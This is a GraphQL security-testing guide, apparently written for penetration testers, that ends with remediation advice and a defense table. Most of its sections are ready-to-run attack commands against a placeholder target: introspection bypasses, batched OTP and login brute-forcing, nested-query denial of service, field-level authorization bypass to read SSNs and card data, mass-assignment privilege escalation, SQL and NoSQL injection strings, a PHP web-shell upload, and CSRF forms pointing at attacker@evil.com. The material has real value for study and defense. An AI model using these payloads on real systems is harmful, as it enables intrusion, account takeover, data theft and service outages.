# GraphQL Security Testing Guide

Deep-dive methodology for discovering and exploiting GraphQL-specific vulnerabilities, covering introspection attacks, query abuse, authorization bypass, mutation injection, and tooling.

---

## 1. GraphQL Fundamentals for Security Testing

### 1.1 How GraphQL Differs from REST

GraphQL exposes a single endpoint (typically `/graphql`) and lets clients define exactly what data they retrieve. This flexibility introduces unique attack surfaces:

- **Single endpoint** means traditional path-based fuzzing is less useful; the attack surface lives in query structure.
- **Strongly typed schema** can be leaked via introspection, revealing the entire data model.
- **Client-controlled queries** enable depth attacks, batch abuse, and field-level authorization bypass.
- **Mutations** replace REST POST/PUT/DELETE but often lack per-field validation.

### 1.2 Common GraphQL Endpoints

```bash
# Standard paths to probe
/graphql
/graphiql
/graphql/console
/v1/graphql
/api/graphql
/query
/gql

# Detection via OPTIONS or POST with empty body
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__typename}"}' | jq .
# Response containing {"data":{"__typename":"Query"}} confirms GraphQL
```

### 1.3 Reconnaissance Checklist

Before attacking, establish the environment:

1. Confirm the GraphQL endpoint location.
2. Determine whether introspection is enabled.
3. Identify the GraphQL engine (Apollo, Hasura, graphql-yoga, AWS AppSync).
4. Check for GraphiQL or Altair IDE exposed in the browser.
5. Note authentication mechanism (Bearer token, cookie, API key).

---

## 2. Introspection Attacks

### 2.1 Full Schema Extraction

Introspection is the single most valuable reconnaissance step. A successful introspection query returns every type, field, argument, mutation, and subscription.

```graphql
# Standard full introspection query
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

```bash
# curl one-liner for introspection
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"query{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name kind ofType{name}}}}}}"}'  | jq .
```

### 2.2 Extracting Sensitive Types

After obtaining the schema, filter for high-value types:

```bash
# Save introspection result
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}' \
     -o schema.json

# Extract types with sensitive names
cat schema.json | jq '.data.__schema.types[] | select(.name | test("User|Admin|Token|Secret|Password|Payment|Role|Permission|Credential"; "i")) | {name, fields: [.fields[].name]}'

# List all mutations (write operations)
cat schema.json | jq '.data.__schema.types[] | select(.name == "Mutation") | .fields[] | {name, args: [.args[].name]}'

# List all queries
cat schema.json | jq '.data.__schema.types[] | select(.name == "Query") | .fields[] | {name, args: [.args[].name]}'
```

### 2.3 Bypassing Introspection Restrictions

Some applications disable introspection but do so improperly:

```bash
# Technique 1: Use __type instead of __schema
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__type(name:\"User\"){name fields{name type{name}}}}"}'

# Technique 2: GET request with query parameter (may bypass POST-only restrictions)
curl -s "https://target.com/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"

# Technique 3: Newline/whitespace obfuscation
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{\n__schema\n{\nqueryType\n{\nname\n}\n}\n}"}'

# Technique 4: Use field suggestions (error messages leak field names)
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{user{doesNotExist}}"}' | jq '.errors[].message'
# Response may contain: "Did you mean 'name', 'email', 'role'?"

# Technique 5: Aliased introspection fragments
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{a:__schema{types{name}}}"}'
```

---

## 3. Batch Query Abuse and Nested Query DoS

### 3.1 Batch Query Attacks

GraphQL commonly supports batched queries in a single request. This enables brute force and enumeration without triggering per-request rate limits.

```bash
# Batch query — enumerate users by ID
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '[
       {"query":"{user(id:1){email}}"},
       {"query":"{user(id:2){email}}"},
       {"query":"{user(id:3){email}}"},
       {"query":"{user(id:4){email}}"},
       {"query":"{user(id:5){email}}"}
     ]' | jq .

# Batch brute force OTP/2FA codes
# Generate batch payload programmatically
python3 -c "
import json
queries = []
for code in range(0, 10000):
    q = {'query': 'mutation{verifyOtp(code:\"%04d\"){success token}}' % code}
    queries.append(q)
# Send in chunks of 100
for i in range(0, len(queries), 100):
    chunk = json.dumps(queries[i:i+100])
    print(chunk)
" | head -1 > batch_otp.json
```

### 3.2 Alias-Based Batching

Even when array batching is disabled, aliases bypass the restriction:

```graphql
# Single query with aliases — effectively 5 queries in one
query {
  u1: user(id: 1) { email role }
  u2: user(id: 2) { email role }
  u3: user(id: 3) { email role }
  u4: user(id: 4) { email role }
  u5: user(id: 5) { email role }
}
```

```bash
# Alias-based username enumeration
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"query{a1:login(username:\"admin\",password:\"test\"){success} a2:login(username:\"root\",password:\"test\"){success} a3:login(username:\"user\",password:\"test\"){success}}"}'
```

### 3.3 Nested Query DoS (Query Depth Attack)

Recursive relationships in the schema allow exponential query expansion:

```graphql
# Depth attack — exponential server-side computation
query DepthAttack {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  id
                  email
                }
              }
            }
          }
        }
      }
    }
  }
}
```

```bash
# Automated depth testing
python3 -c "
depth = 20
inner = 'id email'
for i in range(depth):
    inner = 'friends { ' + inner + ' }'
query = '{ user(id:1) { ' + inner + ' } }'
print(query)
" | xargs -I {} curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{}"}'
```

### 3.4 Query Complexity Attack

Wide queries with many fields and fragments can exhaust server resources even at shallow depth:

```graphql
# Complexity attack — request all fields of all types
query ComplexityAttack {
  users(first: 1000) {
    id email name role
    posts(first: 1000) {
      id title body createdAt
      comments(first: 1000) {
        id body
        author {
          id email name role
        }
      }
    }
    payments(first: 1000) {
      id amount currency status
    }
  }
}
```

---

## 4. Authorization Bypass via Field-Level Access Control Gaps

### 4.1 Concept

GraphQL resolves fields individually. Authorization checks may exist on the query/mutation level but not on individual fields. This leads to data leakage.

### 4.2 Testing Strategy

```bash
# Step 1: Query your own user with all available fields
curl -s -X POST https://target.com/graphql \
     -H "Authorization: Bearer USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"query":"{me{id email name role ssn creditCard{number cvv} internalNotes}}"}'

# Step 2: Query another user's sensitive fields
curl -s -X POST https://target.com/graphql \
     -H "Authorization: Bearer USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"query":"{user(id:2){id email role ssn creditCard{number cvv} internalNotes}}"}'

# Step 3: Use fragments to request sensitive fields indirectly
curl -s -X POST https://target.com/graphql \
     -H "Authorization: Bearer USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"query":"fragment SensitiveFields on User { ssn creditCard { number } role } query { user(id:2) { ...SensitiveFields } }"}'
```

### 4.3 Horizontal Privilege Escalation via Nested Objects

```graphql
# Access another user's data through a relationship
query {
  post(id: 42) {
    author {
      id
      email
      ssn
      creditCard { number expiry }
    }
  }
}

# Access admin data through a public object
query {
  publicProject(id: 1) {
    owner {
      id
      role
      apiKeys { key secret }
    }
  }
}
```

### 4.4 Subscription Authorization Bypass

```graphql
# Subscribe to events you should not receive
subscription {
  orderUpdated(userId: 2) {
    id
    status
    total
    shippingAddress
    paymentInfo { cardLast4 }
  }
}

# Subscribe to admin events
subscription {
  adminNotification {
    type
    message
    affectedUsers { id email }
  }
}
```

---

## 5. Mutation Injection and Input Validation Bypass

### 5.1 Mass Assignment via Mutations

```bash
# Normal profile update
curl -s -X POST https://target.com/graphql \
     -H "Authorization: Bearer USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"query":"mutation{updateProfile(input:{name:\"Test User\"}){id name}}"}'

# Inject additional fields (role, isAdmin, permissions)
curl -s -X POST https://target.com/graphql \
     -H "Authorization: Bearer USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"query":"mutation{updateProfile(input:{name:\"Test\",role:\"admin\",isAdmin:true,permissions:[\"read\",\"write\",\"delete\"]}){id name role isAdmin}}"}'

# Account registration with privilege escalation
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"mutation{register(input:{username:\"attacker\",password:\"P@ss1234\",email:\"a@a.com\",role:\"admin\",isVerified:true}){id role isVerified}}"}'
```

### 5.2 SQL Injection through GraphQL Arguments

```bash
# String argument injection
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{user(name:\"admin\\\" OR 1=1--\"){id email role}}"}'

# Injection via search/filter arguments
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{users(filter:{name_contains:\"\\\" UNION SELECT username,password FROM users--\"}){id name}}"}'

# NoSQL injection in GraphQL (MongoDB backends)
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"mutation{login(username:\"admin\",password:{\"$ne\":\"\"})  {token}}"}'
```

### 5.3 File Upload via Mutations

```bash
# GraphQL multipart file upload (per graphql-multipart-request-spec)
curl -s -X POST https://target.com/graphql \
     -F 'operations={"query":"mutation($file:Upload!){uploadAvatar(file:$file){url}}","variables":{"file":null}}' \
     -F 'map={"0":["variables.file"]}' \
     -F '0=@malicious.php;type=image/png'
# Test: content-type bypass, path traversal in filename, oversized files
```

### 5.4 CSRF via GraphQL

```html
<!-- GET-based CSRF (if GraphQL accepts GET requests) -->
<img src="https://target.com/graphql?query=mutation{deleteAccount(id:1){success}}">

<!-- POST-based CSRF with application/x-www-form-urlencoded -->
<form action="https://target.com/graphql" method="POST">
  <input type="hidden" name="query" value="mutation{changeEmail(email:&quot;attacker@evil.com&quot;){success}}">
  <input type="submit" value="Click me">
</form>
```

---

## 6. GraphQL-Specific Tools

### 6.1 InQL (Burp Suite Extension)

InQL integrates with Burp Suite for automated GraphQL analysis.

```
Installation:
1. Open Burp Suite -> Extender -> BApp Store
2. Search "InQL" -> Install
3. Or: download from https://github.com/doyensec/inql

Features:
- Automatic introspection query execution
- Schema visualization (types, fields, relationships)
- Query generation for all queries and mutations
- Batch attack payload generation
- Integrates with Burp Scanner and Repeater

Usage:
1. Set target URL in InQL Scanner tab
2. Click "Analyze" to run introspection
3. Review discovered types, queries, mutations
4. Right-click any query -> "Send to Repeater" for manual testing
5. Use "Attacker" tab for batch/DoS payload generation
```

### 6.2 graphql-cop (GraphQL Security Auditor)

```bash
# Installation
pip3 install graphql-cop

# Basic scan
graphql-cop -t https://target.com/graphql

# With authentication
graphql-cop -t https://target.com/graphql \
            -H "Authorization: Bearer TOKEN"

# What it checks:
# - Introspection enabled
# - Field suggestions enabled (information leakage)
# - GET method queries accepted (CSRF risk)
# - Batch queries allowed
# - Query depth limit presence
# - Alias-based attacks possible
# - Debug mode enabled
# - Tracing enabled (performance data leakage)
```

### 6.3 Altair GraphQL Client

```
Installation:
- Browser extension: Chrome/Firefox web store -> "Altair GraphQL Client"
- Desktop app: https://altairgraphql.dev/
- Or: npm install -g altair

Features for security testing:
1. Interactive query builder with autocomplete (uses introspection)
2. Header management (easy token swapping for auth testing)
3. Environment variables (switch between users rapidly)
4. Request history (compare responses for different auth levels)
5. File upload support (test upload mutations)
6. Subscription testing (WebSocket-based)

Security testing workflow:
1. Set endpoint URL
2. Run introspection (Docs panel auto-populates)
3. Create environments: "admin", "user", "unauthenticated"
4. Execute same queries across environments
5. Compare responses for authorization gaps
```

### 6.4 BatchQL

```bash
# Installation
git clone https://github.com/assetnote/batchql.git
cd batchql && pip3 install -r requirements.txt

# Detect batch query support
python3 batch.py -e https://target.com/graphql

# Perform batch attack
python3 batch.py -e https://target.com/graphql \
                 -q '{"query":"mutation{login(user:\"§USER§\",pass:\"§PASS§\"){token}}"}'
```

### 6.5 Additional Tools

| Tool | Purpose | Installation |
|------|---------|--------------|
| **graphw00f** | GraphQL engine fingerprinting | `pip3 install graphw00f` |
| **CrackQL** | Rate-limit bypass via alias batching | `git clone https://github.com/nicholasaleks/CrackQL` |
| **graphql-path-enum** | Path enumeration through schema | `cargo install graphql-path-enum` |
| **clairvoyance** | Schema recovery without introspection | `pip3 install clairvoyance` |

```bash
# graphw00f — identify the GraphQL engine
graphw00f -t https://target.com/graphql
# Output: "Apollo Server", "Hasura", "graphql-yoga", etc.
# Knowing the engine helps select engine-specific attacks

# clairvoyance — recover schema when introspection is disabled
clairvoyance https://target.com/graphql -o recovered_schema.json
# Uses field suggestion errors to reconstruct the schema
```

---

## 7. Step-by-Step Testing Methodology

### Phase 1: Discovery and Fingerprinting

```
Step 1.1: Locate the GraphQL endpoint
  - Probe common paths: /graphql, /gql, /graphiql, /v1/graphql, /api/graphql
  - Check JavaScript bundles for endpoint references
  - Monitor network traffic in browser DevTools

Step 1.2: Fingerprint the engine
  - Use graphw00f to identify Apollo, Hasura, graphql-yoga, etc.
  - Check response headers (X-Powered-By, Server)
  - Analyze error message format (engine-specific patterns)

Step 1.3: Check for development tools
  - GraphiQL IDE exposed at /graphiql
  - Altair or Playground at /playground
  - Voyager at /voyager (schema visualization)
```

### Phase 2: Schema Extraction

```
Step 2.1: Attempt full introspection query
  - Use the standard IntrospectionQuery (Section 2.1)
  - Save the complete schema to a JSON file

Step 2.2: If introspection is disabled, bypass or recover
  - Try __type queries for specific types (Section 2.3)
  - Use clairvoyance for field suggestion recovery
  - Analyze client-side code for query fragments

Step 2.3: Map the attack surface
  - List all queries, mutations, and subscriptions
  - Identify types with sensitive fields (User, Payment, Admin)
  - Note input types for mutation arguments
  - Document all enum types (may reveal internal values)
```

### Phase 3: Authentication and Authorization Testing

```
Step 3.1: Test unauthenticated access
  - Send queries without any auth headers
  - Check which queries and mutations are accessible
  - Note any data returned (information disclosure)

Step 3.2: Test horizontal privilege escalation
  - Query other users' data by changing ID arguments
  - Access sensitive fields through nested relationships
  - Use fragments to request fields that may be filtered

Step 3.3: Test vertical privilege escalation
  - Attempt admin mutations with a regular user token
  - Inject role/permission fields in update mutations
  - Check if subscription events leak privileged data

Step 3.4: Test field-level authorization
  - For each sensitive field (ssn, creditCard, apiKey, etc.)
  - Query via direct access, nested access, and fragments
  - Compare responses across different auth levels
```

### Phase 4: Input Validation and Injection

```
Step 4.1: SQL/NoSQL injection via arguments
  - Test string arguments with SQL payloads
  - Test filter/search arguments with injection strings
  - For MongoDB backends, test NoSQL operator injection

Step 4.2: Mass assignment via mutations
  - Add extra fields to update mutations (role, isAdmin)
  - Test registration mutations with privilege fields
  - Check if read-only fields can be written

Step 4.3: File upload testing
  - Test content-type bypass
  - Test filename injection (path traversal)
  - Test oversized file upload
  - Test malicious file content (web shells)
```

### Phase 5: Denial of Service

```
Step 5.1: Query depth attack
  - Identify recursive relationships in schema
  - Send progressively deeper nested queries
  - Monitor response times and server behavior
  - Document the maximum depth before error or timeout

Step 5.2: Query complexity attack
  - Request maximum records per page (first: 10000)
  - Select all available fields
  - Combine with nested relationships

Step 5.3: Batch query abuse
  - Send array-batched requests with increasing count
  - Test alias-based batching if array batching is blocked
  - Measure if rate limits apply per-request or per-query
```

### Phase 6: Reporting

```
Step 6.1: Document findings with severity
  - CRITICAL: Unauthenticated access to sensitive data, SQL injection
  - HIGH: Authorization bypass, mass assignment, introspection enabled
  - MEDIUM: Batch query abuse, missing depth limits
  - LOW: Field suggestions enabled, verbose error messages

Step 6.2: Provide reproduction steps
  - Include exact curl commands or Burp requests
  - Document the authentication context (token, user role)
  - Include both the vulnerable request and expected secure behavior

Step 6.3: Recommend remediation
  - Disable introspection in production
  - Implement query depth limits (max 10-15)
  - Implement query complexity analysis (max 1000)
  - Add field-level authorization in resolvers
  - Disable batch queries or limit batch size
  - Use a persisted query allowlist for production
```

---

## Defense Reference

| Control | Implementation | Notes |
|---------|---------------|-------|
| Disable introspection | Apollo: `introspection: false` | Must verify with manual test |
| Query depth limit | `graphql-depth-limit` middleware, max 10-15 | Blocks nested query DoS |
| Query complexity | `graphql-query-complexity` middleware, max 1000 | Blocks wide query DoS |
| Batch limit | Limit array batch to 5-10 queries | Blocks brute force batching |
| Field authorization | Check permissions in each resolver | Prevents field-level leakage |
| Rate limiting | Per-user, per-query-type limits | Apply per operation, not per HTTP request |
| Input validation | Use custom scalars and input validation directives | Prevents injection attacks |
| Persisted queries | Allowlist approved queries, reject arbitrary queries | Strongest defense for production APIs |
| Disable field suggestions | Apollo: `formatError` to strip suggestions | Prevents schema recovery via errors |

---

**Document version**: 1.0
**Created**: 2026-05-22
**Estimated study time**: 4-5 hours
**Prerequisites**: Familiarity with `skills/api-security/SKILL.md` and `skills/api-security/guides/api-security-complete-guide.md`
